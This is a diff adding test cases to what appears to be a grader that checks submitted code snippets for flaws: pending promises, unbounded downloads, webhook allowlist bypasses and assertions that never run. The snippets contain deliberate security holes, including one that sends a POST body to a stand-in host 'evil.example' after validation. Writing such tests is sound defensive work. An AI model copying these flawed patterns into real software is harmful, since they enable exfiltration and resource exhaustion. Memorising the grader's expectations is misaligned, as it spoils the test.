@@ -1984,6 +1984,155 @@ test('bounds: writing the chunk somewhere other than the destination fails', () 
   assert.equal(r.pass, false);
 });
 
+// --- round 5: every path in, every path out, and the right object ---
+
+test('lifecycle: an early return before settlement leaves the promise pending', () => {
+  const r = check('lifecycle',
+    '```javascript\nfunction waitForDownload(emitter, signal) {\n  return new Promise((resolve, reject) => {\n    if (signal.aborted) return reject(signal.reason);\n' + '    const cleanup = () => { emitter.off("download", done); signal.removeEventListener("abort", aborted); };\n' +
+  '    const done = value => { if (ignore) return; cleanup(); resolve(value); };\n' +
+  '    const aborted = () => { cleanup(); reject(signal.reason); };\n' + '    emitter.once("download", done); signal.addEventListener("abort", aborted);\n  });\n}\n```');
+  assert.equal(r.pass, false);
+});
+
+test('revalidate: a negated expression with a bypass clause is not the policy', () => {
+  const r = check('revalidate',
+    '```javascript\nconst saved = JSON.parse(text);\nconst url = new URL(saved.webhook);\n' +
+  'if (!(url.protocol === "https:" && allowedHosts.has(url.hostname) || bypass)) throw new Error("bad");\n' +
+  'await fetch(url, { method: "POST", body, redirect: "error" });\n```');
+  assert.equal(r.pass, false);
+});
+
+test('revalidate: returning the validator exits before the request', () => {
+  const r = check('revalidate',
+    '```javascript\nasync function validateWebhookUrl(candidate) {\n  if (candidate.protocol !== "https:") throw new Error("x");\n  if (!allowedHosts.has(candidate.hostname)) throw new Error("y");\n}\n' +
+  'const saved = JSON.parse(text);\nconst url = new URL(saved.webhook);\nreturn validateWebhookUrl(url);\n' +
+  'await fetch(url, { method: "POST", body, redirect: "error" });\n```');
+  assert.equal(r.pass, false);
+});
+
+test('contracts: bare assert takes a message, not an expected value', () => {
+  const r = check('contracts',
+    '```javascript\nfunction updateSettings(current, patch) { return { ...current, ...patch }; }\n' +
+  'const result = updateSettings({ theme: "dark", sound: true, label: "x" }, { sound: false, volume: 0, label: "" });\n' +
+  'assert(result.sound, false); assert(result.volume, 0);\nassert(result.label, ""); assert(result.theme, "dark");\n```');
+  assert.equal(r.pass, false);
+});
+
+test('bounds: tearing down an unrelated object leaves the reader open', () => {
+  const r = check('bounds',
+    '```javascript\nconst response = await fetch(url, { signal: AbortSignal.timeout(10000) });\nconst file = await open(destination, "w");\nconst reader = response.body.getReader();\nlet received = 0;\nwhile (true) {\n  const { done, value } = await reader.read(); if (done) break;\nreceived += value.byteLength;\n' +
+  '  if (received > MAX_BYTES) { await audit.cancel(); throw new Error("too large"); }\nawait file.write(value);\n}\n```');
+  assert.equal(r.pass, false);
+});
+
+test('lifecycle: a URL inside a multiline template is not a comment', () => {
+  const r = check('lifecycle',
+    '```javascript\nfunction waitForDownload(emitter, signal) {\n  return new Promise((resolve, reject) => {\n    if (signal.aborted) return reject(signal.reason);\n' + '    const cleanup = () => { emitter.off("download", done); signal.removeEventListener("abort", aborted); };\n' +
+  '    const done = value => { log(`start\nhttps://example.com`); cleanup(); resolve(value); };\n' +
+  '    const aborted = () => { cleanup(); reject(signal.reason); };\n' + '    emitter.once("download", done); signal.addEventListener("abort", aborted);\n  });\n}\n```');
+  assert.equal(r.pass, true);
+});
+
+test('bounds: an options binding in a branch does not bound the request', () => {
+  const r = check('bounds',
+    '```javascript\nlet options;\nif (useDeadline) { options = { signal: AbortSignal.timeout(1000) }; }\n' +
+  'const response = await fetch(url, options);\nconst file = await open(destination, "w");\n' +
+  'const reader = response.body.getReader();\nlet received = 0;\nwhile (true) {\n  const { done, value } = await reader.read(); if (done) break;\nreceived += value.byteLength;\n' +
+  '  if (received > MAX_BYTES) { await reader.cancel(); throw new Error("too large"); }\nawait file.write(value);\n}\n```');
+  assert.equal(r.pass, false);
+});
+
+test('bounds: a destination-shaped parameter is not the destination', () => {
+  const r = check('bounds',
+    '```javascript\nasync function download(url, destination, auditOutput) {\n' +
+  '  const response = await fetch(url, { signal: AbortSignal.timeout(10000) });\n' +
+  '  const audit = createWriteStream(auditOutput);\n' +
+  '  const reader = response.body.getReader();\n  let received = 0;\n  while (true) {\n' +
+  '    const { done, value } = await reader.read(); if (done) break;\n    received += value.byteLength;\n' +
+  '    if (received > MAX_BYTES) { await reader.cancel(); throw new Error("too large"); }\n    await audit.write(value);\n  }\n}\n```');
+  assert.equal(r.pass, false);
+});
+
+test('hardware: an environment knob in an uncalled helper is unreachable', () => {
+  const r = check('hardware',
+    '```python\ndef read_temperature(adc):\n    beta = 3950\n    return _steinhart(adc.read(0), beta)\n\n' +
+  'def unused():\n    beta = os.environ["BETA"]\n    return beta\n```\nReturns Celsius.');
+  assert.equal(r.pass, false);
+});
+
+test('onecheck: a self-recursive helper is still never entered', () => {
+  const r = check('onecheck',
+    '```python\ndef to_seconds(s):\n    return 0\n\ndef unused():\n    try:\n        to_seconds("abc")\n    except ValueError:\n        pass\n    else:\n        assert False\n    unused()\n```');
+  assert.equal(r.pass, false);
+});
+
+test('bounds: a negative timeout throws before the request starts', () => {
+  const r = check('bounds',
+    '```javascript\nconst response = await fetch(url, { signal: AbortSignal.timeout(-1) });\nconst file = await open(destination, "w");\n' +
+  'const reader = response.body.getReader();\nlet received = 0;\nwhile (true) {\n  const { done, value } = await reader.read(); if (done) break;\nreceived += value.byteLength;\n' +
+  '  if (received > MAX_BYTES) { await reader.cancel(); throw new Error("too large"); }\nawait file.write(value);\n}\n```');
+  assert.equal(r.pass, false);
+});
+
+test('revalidate: a mutation before a second POST reuses stale guards', () => {
+  const r = check('revalidate',
+    '```javascript\nconst saved = JSON.parse(text);\nconst url = new URL(saved.webhook);\n' +
+  'if (url.protocol !== "https:" || !allowedHosts.has(url.hostname)) throw new Error("bad");\n' +
+  'await fetch(url, { method: "POST", body, redirect: "error" });\nurl.hostname = "evil.example";\n' +
+  'await fetch(url, { method: "POST", body, redirect: "error" });\n```');
+  assert.equal(r.pass, false);
+});
+
+test('lifecycle: a conditional throwIfAborted installs listeners anyway', () => {
+  const r = check('lifecycle',
+    '```javascript\nasync function waitForDownload(emitter, signal) {\n  if (strict) signal.throwIfAborted();\n' +
+  '  return new Promise((resolve, reject) => {\n' + '    const cleanup = () => { emitter.off("download", done); signal.removeEventListener("abort", aborted); };\n' +
+  '    const done = value => { cleanup(); resolve(value); };\n' +
+  '    const aborted = () => { cleanup(); reject(signal.reason); };\n' + '    emitter.once("download", done); signal.addEventListener("abort", aborted);\n  });\n}\n```');
+  assert.equal(r.pass, false);
+});
+
+test('bounds: a bounded probe does not excuse an unbounded download', () => {
+  const r = check('bounds',
+    '```javascript\nconst meta = await fetch(metaUrl, { signal: AbortSignal.timeout(5000) });\n' +
+  'const response = await fetch(url);\nconst file = await open(destination, "w");\n' +
+  'const reader = response.body.getReader();\nlet received = 0;\nwhile (true) {\n  const { done, value } = await reader.read(); if (done) break;\nreceived += value.byteLength;\n' +
+  '  if (received > MAX_BYTES) { await reader.cancel(); throw new Error("too large"); }\nawait file.write(value);\n}\n```');
+  assert.equal(r.pass, false);
+});
+
+test('bounds: an accumulator starting below zero never trips the ceiling', () => {
+  const r = check('bounds',
+    '```javascript\nconst response = await fetch(url, { signal: AbortSignal.timeout(10000) });\nconst file = await open(destination, "w");\n' +
+  'const reader = response.body.getReader();\nlet received = -Infinity;\nwhile (true) {\n  const { done, value } = await reader.read(); if (done) break;\nreceived += value.byteLength;\n' +
+  '  if (received > MAX_BYTES) { await reader.cancel(); throw new Error("too large"); }\nawait file.write(value);\n}\n```');
+  assert.equal(r.pass, false);
+});
+
+test('revalidate: a fetch Response has no write, so no payload was sent', () => {
+  const r = check('revalidate',
+    '```javascript\nconst saved = JSON.parse(text);\nconst url = new URL(saved.webhook);\n' +
+  'if (url.protocol !== "https:" || !allowedHosts.has(url.hostname)) throw new Error("bad");\n' +
+  'const response = await fetch(url, { method: "POST", redirect: "error" });\nresponse.write(body);\n```');
+  assert.equal(r.pass, false);
+});
+
+test('contracts: a check inside if (false) never runs', () => {
+  const r = check('contracts',
+    '```javascript\nfunction updateSettings(current, patch) { return { ...current, ...patch }; }\n' +
+  'if (false) {\n  const result = updateSettings({ theme: "dark", sound: true, label: "x" }, { sound: false, volume: 0, label: "" });\n' +
+  '  console.assert(result.sound === false); console.assert(result.volume === 0);\n' +
+  '  console.assert(result.label === ""); console.assert(result.theme === "dark");\n}\n```');
+  assert.equal(r.pass, false);
+});
+
+test('onecheck: a helper forwarding a ternary never passes the input on', () => {
+  const r = check('onecheck',
+    '```python\ndef parse_duration(s):\n    return 0\n\ndef helper(value):\n    return parse_duration("1h" if True else value)\n\n' +
+  'with pytest.raises(ValueError):\n    helper("bad")\n```');
+  assert.equal(r.pass, false);
+});
+
 // --- unknown probe is skipped, not failed ---
 
 test('unknown probe is skipped', () => {
